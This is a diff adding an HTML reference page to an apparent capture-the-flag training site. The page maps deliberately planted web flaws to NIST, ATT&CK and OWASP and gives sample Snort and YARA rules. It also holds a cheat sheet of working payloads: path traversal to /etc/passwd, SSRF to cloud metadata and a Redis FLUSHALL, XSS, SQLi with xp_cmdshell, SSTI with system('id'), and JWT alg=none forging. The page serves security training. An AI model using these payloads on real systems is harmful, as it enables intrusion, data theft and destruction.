@@ -1,0 +1,302 @@
+<!doctype html>
+<!--
+  CYBERWORLD :: LORE VAULT
+  This page is intentionally a maze. Everything below is here on purpose:
+  RFC excerpts, NIST control IDs, MITRE ATT&CK / D3FEND mappings, CWE / OWASP
+  pointers, Snort / YARA / Suricata snippets, an attack-tree ASCII map, and
+  a cheat sheet of common LFI / SSRF / XSS / SQLi / SSTI payload shapes for
+  recon-by-grep. None of this is required to solve the CTF. All of it is
+  there so the analyst who opens "view source" gets a recon exercise.
+
+  No live exploitation. No credential collection. No third-party fetches.
+  Reading these notes will not help you cheat; the answer key is committed
+  hash-only in manifest.json, with hints gated behind a deliberate user
+  action in intercept.html.
+
+  Person / FLLC <https://fllc.net> // FLLC Purple-Team OS
+  Provided as is for demonstration and educational purposes only.
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; form-action 'none'; base-uri 'self'; object-src 'none'; upgrade-insecure-requests">
+  <meta name="robots" content="noindex,nofollow">
+  <title>CyberWorld :: Lore Vault</title>
+  <style>
+    :root { --cyan:#00ffe7; --pink:#ff0055; --text:#edf8fb; --muted:#8ba8b7; --warn:#ffbf00; --ok:#20d978; --panel:rgba(9,13,25,0.94); }
+    *{box-sizing:border-box} html,body{min-height:100%;margin:0}
+    body{color:var(--text);background:radial-gradient(circle at 50% 28%,rgba(0,255,231,.16),rgba(0,255,231,.03) 30%,transparent 58%),linear-gradient(135deg,#0a171d 0%,#101528 51%,#244f60 100%);font-family:"Courier New",Consolas,ui-monospace,monospace;line-height:1.55}
+    body::before{content:"";position:fixed;inset:0;background:linear-gradient(rgba(0,255,231,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,231,.05) 1px,transparent 1px);background-size:32px 32px;pointer-events:none;z-index:0}
+    body::after{content:"";position:fixed;inset:0;background:linear-gradient(transparent,rgba(0,0,0,.2),transparent);background-size:100% 4px;opacity:.32;pointer-events:none;z-index:0}
+    main{position:relative;z-index:1;width:min(960px,calc(100vw - 32px));margin:24px auto;padding:24px 28px;border:1px solid var(--cyan);border-radius:10px;background:linear-gradient(180deg,rgba(13,18,34,.98),rgba(8,11,22,.96)),var(--panel)}
+    h1{margin:0;color:var(--cyan);font-size:1.7rem;letter-spacing:.16em;text-transform:uppercase}
+    h2{margin:22px 0 6px;color:var(--cyan);font-size:.92rem;letter-spacing:.14em;text-transform:uppercase;border-bottom:1px solid rgba(0,255,231,.22);padding-bottom:4px}
+    h3{margin:14px 0 4px;color:var(--warn);font-size:.78rem;letter-spacing:.1em;text-transform:uppercase}
+    pre{padding:10px 12px;border:1px solid rgba(0,255,231,.18);border-radius:4px;background:#0a121e;color:#cfe;font-size:.74rem;overflow-x:auto}
+    code{color:var(--warn);background:#0a121e;padding:1px 4px;border-radius:3px;font-size:.78rem}
+    .nav{margin-bottom:14px;font-size:.7rem;color:var(--muted)}
+    .nav a{color:var(--cyan);border-bottom:1px dotted var(--cyan);text-decoration:none;margin-right:14px}
+    .tag{color:var(--pink);letter-spacing:.18em;text-transform:uppercase;font-size:.78rem}
+    .grid{display:grid;grid-template-columns:1fr;gap:10px}
+    @media(min-width:780px){.grid{grid-template-columns:1fr 1fr}}
+    .card{padding:10px 12px;border:1px solid rgba(0,255,231,.25);border-radius:6px;background:rgba(8,13,23,.6)}
+    .small{font-size:.78rem;color:var(--muted)}
+    ul{margin:6px 0;padding-left:20px;font-size:.82rem}
+  </style>
+</head>
+<body>
+  <main>
+    <div class="nav">
+      <a href="index.html">gate</a>
+      <a href="lab.html">lab</a>
+      <a href="intercept.html">intercept</a>
+      <a href="challenge.html">brief</a>
+      <a href="manifest.json">manifest</a>
+      <a href="hints.json">hints</a>
+      <a href="sw-ctf.js">sw-ctf.js</a>
+    </div>
+
+    <h1>CyberWorld :: Lore Vault</h1>
+    <p class="tag">FLLC Purple-Team OS // training surface only</p>
+    <p class="small">A deliberately dense vault of references and recon material. Treat it as a CTF prop:
+       everything here is real public knowledge, none of it is the answer key, and a few items
+       are decoys in disguise. The honest entry points are <code>challenge.html</code> and
+       <code>intercept.html</code>.</p>
+
+    <h2>Attack tree</h2>
+    <pre>cyberworld :: web-app auth bypass
+.
++-- tier 1 client-side audit         [F01-F10]
+|   +-- credentials never validated server-side          (CWE-602)
+|   +-- session token forgeable in sessionStorage        (CWE-384)
+|   +-- CSP allows inline scripts                        (CWE-1021)
+|   +-- honeypot bot-friction only                       (not security)
+|   +-- PNG signature + IEND tail + alpha-LSB stego
+|   +-- weak-password Bloom filter is client-side        (CWE-521)
+|   +-- Hashcash 18-bit = compute, not identity          (CWE-294)
+|   +-- inline bootstrap is deliberate teaching artifact
+|   +-- console.html re-validates the same chain
++-- tier 2 cryptanalysis             [F11-F15]
+|   +-- RSA toy n=3233 trial-divides                     (CWE-326)
+|   +-- ECDSA P-256 verified -- NOT the attack vector
+|   +-- HMAC trunc 16-bit -> 2^8 birthday                (CWE-326)
+|   +-- Vigenere Z/26 Kasiski + IC                       (RFC 7515 sec.A.1 prose)
++-- tier 3 intel pivot               [F16-F20]
+|   +-- CVE attribution (NVD)
+|   +-- ATT&CK technique mapping (T1078)
+|   +-- IR phase recognition (NIST SP 800-61 R3)
+|   +-- actor cluster (Mandiant UNC tracker)
+|   +-- ZWSP stego (U+200B / U+200D)
++-- tier 4 web pentest               [F21-F30]
+|   +-- alg=none JWT acceptance                          (CVE-2015-9235 class)
+|   +-- IDOR / BOLA on /profile                          (CWE-639)
+|   +-- path traversal on /files                         (CWE-22)
+|   +-- X-Forwarded-For trust on /admin/geo              (CWE-348)
+|   +-- HPP last-wins on /hpp                            (CWE-235)
+|   +-- race condition on /redeem                        (CWE-362)
++-- tier 5 deeper chain              [F31-F33]
+    +-- HS/RS JWT key confusion                          (RFC 8725 sec.3.1)
+    +-- prototype pollution -> admin/console             (CWE-1321)
+    +-- SW cache-vs-auth confusion                       (CWE-639 variant)</pre>
+
+    <h2>RFC / standards excerpts (paraphrased)</h2>
+    <div class="grid">
+      <div class="card">
+        <h3>RFC 7515 sec. 8 (JWS Unsecured)</h3>
+        <p class="small">"none" indicates an unsecured JWS. Implementations that verify a signature
+           MUST reject "none" as an algorithm by default. The Tier-4 SW does not. That is the lesson.</p>
+      </div>
+      <div class="card">
+        <h3>RFC 8725 sec. 3.1 (JWT BCP)</h3>
+        <p class="small">Algorithm confusion: a verifier that does not bind the public key to the
+           expected algorithm can be tricked into using an RSA public key as an HMAC secret. The
+           Tier-5 SW does this on <code>/api/v1/internal/super</code>.</p>
+      </div>
+      <div class="card">
+        <h3>RFC 9110 sec. 5 (HTTP semantics)</h3>
+        <p class="small">Request and response headers are advisory; trust in them must be earned
+           by upstream context. <code>X-Forwarded-For</code> is set by intermediaries; trusting the
+           first hop is the F27 mistake.</p>
+      </div>
+      <div class="card">
+        <h3>RFC 6797 (HSTS)</h3>
+        <p class="small">Strict-Transport-Security pins TLS-only access. CSP <code>upgrade-insecure-requests</code>
+           is the per-document analog; both ship on this page.</p>
+      </div>
+    </div>
+
+    <h2>NIST control mapping</h2>
+    <ul>
+      <li>AC-2 Account Management -- mirrored in our IDOR demo</li>
+      <li>AC-3 Access Enforcement -- /admin/users is the canonical violation</li>
+      <li>AC-6 Least Privilege -- broken by JWT role=admin forgery</li>
+      <li>AU-2 Audit Events -- absent from this static surface (by design)</li>
+      <li>IA-2 Identification and Authentication -- by Hashcash + session token only</li>
+      <li>IA-5 Authenticator Management -- weak-password Bloom is intentionally bypassable</li>
+      <li>SC-7 Boundary Protection -- /api/v1/admin/geo trusts X-Forwarded-For</li>
+      <li>SC-12 Cryptographic Key Establishment -- key confusion in HS/RS path</li>
+      <li>SC-23 Session Authenticity -- session HMAC binds asset to session</li>
+      <li>SI-10 Information Input Validation -- absent on /api/v1/config/merge (proto pollution)</li>
+    </ul>
+
+    <h2>MITRE ATT&amp;CK / D3FEND</h2>
+    <ul>
+      <li>T1078 Valid Accounts -- the F17 answer; defended by D3-PWA (Strong Password Policy)</li>
+      <li>T1190 Exploit Public-Facing Application -- maps to F26 / F22 / F27</li>
+      <li>T1505.003 Server Software Component: Web Shell -- not implemented; mentioned for recon</li>
+      <li>T1556 Modify Authentication Process -- the chain F22 + F31 effectively does this</li>
+      <li>T1606 Forge Web Credentials -- F22 / F24 / F31 are all instances</li>
+      <li>D3FEND D3-OTF One-Time Password -- not implemented; defense the gate lacks</li>
+      <li>D3FEND D3-MFA Multi-Factor Authentication -- same</li>
+    </ul>
+
+    <h2>OWASP Top 10 (2021) mapping</h2>
+    <ul>
+      <li>A01 Broken Access Control -- F23, F24, F25, F33</li>
+      <li>A02 Cryptographic Failures -- F11, F14, F22, F31</li>
+      <li>A03 Injection -- F26 (path), F32 (proto pollution as injection variant)</li>
+      <li>A04 Insecure Design -- F08 (PoW != identity), F09 (CSP audit artefact)</li>
+      <li>A05 Security Misconfiguration -- F03 ('unsafe-inline'), F23 (decoy cookies)</li>
+      <li>A07 Identification and Authentication Failures -- F01, F02, F22, F24</li>
+      <li>A08 Software and Data Integrity Failures -- F05 / F06 (asset binding)</li>
+      <li>A09 Security Logging and Monitoring Failures -- absent by design</li>
+      <li>A10 SSRF -- not implemented (out of scope on a static host)</li>
+    </ul>
+
+    <h2>Snort / Suricata / YARA recon (samples; not active)</h2>
+    <pre>alert http any any -&gt; any 80 (
+  msg:"CYBERWORLD F22 alg=none JWT attempt";
+  flow:to_server,established;
+  content:"Authorization|3a 20|Bearer "; http_header;
+  pcre:"/Bearer\s+[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.($|[\s\r\n])/H";
+  classtype:web-application-attack; sid:1000022; rev:1;
+)</pre>
+    <pre>rule cyberworld_F26_traversal {
+  meta:
+    description = "F26 path-traversal probe against /api/v1/files"
+    author      = "PersonFu / FLLC"
+    cwe         = "CWE-22"
+  strings:
+    $a = "/api/v1/files?name=" ascii
+    $b = "../" ascii
+    $c = "etc/cyberworld.flag" ascii
+  condition:
+    $a and $b and $c
+}</pre>
+    <pre>alert http any any -&gt; any any (
+  msg:"CYBERWORLD F27 X-Forwarded-For trust probe";
+  flow:to_server,established;
+  content:"X-Forwarded-For|3a 20|127.0.0.1"; http_header;
+  classtype:policy-violation; sid:1000027; rev:1;
+)</pre>
+
+    <h2>Common payload shapes (for grep recon)</h2>
+    <div class="grid">
+      <div class="card">
+        <h3>LFI / path traversal</h3>
+<pre>../../../etc/passwd
+....//....//....//etc/passwd
+%2e%2e/%2e%2e/etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+/proc/self/environ
+file:///etc/cyberworld.flag</pre>
+      </div>
+      <div class="card">
+        <h3>SSRF</h3>
+<pre>http://127.0.0.1:8080/_internal
+http://[::1]:80/admin
+http://169.254.169.254/latest/meta-data/    # AWS IMDS v1
+gopher://127.0.0.1:6379/_FLUSHALL%0d%0a     # Redis SSRF
+dict://internal/INFO</pre>
+      </div>
+      <div class="card">
+        <h3>XSS (sanitized; do not use)</h3>
+<pre>"&gt;&lt;svg/onload=alert(1)&gt;
+&lt;img src=x onerror=alert(1)&gt;
+javascript:alert(1)
+'-alert(1)-'
+&lt;iframe srcdoc='&lt;svg/onload=alert(1)&gt;'&gt;</pre>
+      </div>
+      <div class="card">
+        <h3>SQLi sketches (no SQL on this host)</h3>
+<pre>' OR 1=1--
+UNION SELECT NULL,NULL,version()--
+' AND SUBSTRING(@@version,1,1)='5'--
+'; EXEC xp_cmdshell('whoami')--
+' WAITFOR DELAY '0:0:5'--</pre>
+      </div>
+      <div class="card">
+        <h3>SSTI sketches (no template engine here)</h3>
+<pre>{{7*7}}        # Jinja2 / Twig
+${7*7}         # Velocity / Freemarker
+&lt;%= 7*7 %&gt; # ERB / EJS
+#{7*7}         # Ruby / Pug
+&lt;%= system('id') %&gt;</pre>
+      </div>
+      <div class="card">
+        <h3>JWT one-liners</h3>
+<pre># forge alg=none
+echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr +/ -_ | tr -d =
+echo -n '{"role":"admin"}'           | base64 -w0 | tr +/ -_ | tr -d =
+# then concat with a trailing dot
+
+# brute-force HS256 with hashcat
+hashcat -m 16500 token.txt rockyou.txt</pre>
+      </div>
+    </div>
+
+    <h2>ELF / PE / PNG byte layouts</h2>
+    <pre>PNG: 89 50 4e 47 0d 0a 1a 0a   (8-byte signature)
+     ...chunks (length, type, data, CRC)...
+     00 00 00 00 49 45 4e 44 ae 42 60 82   (IEND, last chunk)
+
+ELF: 7f 45 4c 46 02 01 01 00                (magic + class + endian)
+     ...e_ident...                         (16 bytes total)
+     e_type, e_machine, e_version          (then header)
+
+PE:  4d 5a ... 50 45 00 00                 ("MZ" stub + "PE\0\0" sig)
+     0x14c (i386) / 0x8664 (x86_64) / 0xaa64 (arm64) machine values</pre>
+
+    <h2>HTTP/2 frame types (informational)</h2>
+    <pre>0x0 DATA           0x1 HEADERS        0x2 PRIORITY
+0x3 RST_STREAM     0x4 SETTINGS       0x5 PUSH_PROMISE
+0x6 PING           0x7 GOAWAY         0x8 WINDOW_UPDATE
+0x9 CONTINUATION</pre>
+
+    <h2>Cipher suites worth remembering</h2>
+    <pre>TLS_AES_256_GCM_SHA384            (TLS 1.3 mandatory MTI)
+TLS_CHACHA20_POLY1305_SHA256      (TLS 1.3, mobile-friendly)
+ECDHE-ECDSA-AES256-GCM-SHA384     (TLS 1.2)
+ECDHE-RSA-CHACHA20-POLY1305       (TLS 1.2)</pre>
+
+    <h2>Quick-grep shortcuts the analyst should know</h2>
+    <pre># find tokens in JS bundles
+grep -rEon 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' .
+# find SHA-256 hexes
+grep -rEon '\b[0-9a-f]{64}\b' .
+# find AWS keys (decoy fingerprint)
+grep -rEon 'AKIA[0-9A-Z]{16}' .
+# find base64 blobs
+grep -rEon '[A-Za-z0-9+/]{40,}={0,2}' . | head
+# decode the source decoy
+echo REVDT1lfRjAwX25vdF9hX2ZsYWc= | base64 -d
+</pre>
+
+    <h2>Pirate codex</h2>
+    <p class="small">
+      Articles I -- IV of the Cyberworld Pirate Code (training edition):
+    </p>
+    <ol class="small">
+      <li>Ye shall not exfiltrate that which thou cannot prove; the only proof here is hashes.</li>
+      <li>Ye shall not type real credentials into a static-site gate; the gate accepts anything.</li>
+      <li>Ye shall verify thine own work against the manifest commitments before ye claim the flag.</li>
+      <li>Ye shall not chase every decoy; the truly poisoned `.env.bak` has the watermark <code>DECOY__</code>.</li>
+    </ol>
+
+    <p class="small">// PersonFu &lt;https://github.com/Personfu&gt; / FLLC &lt;https://fllc.net&gt;
+       // FLLC Purple-Team OS // provided as is for demonstration and educational purposes only.</p>
+  </main>
+</body>
+</html>
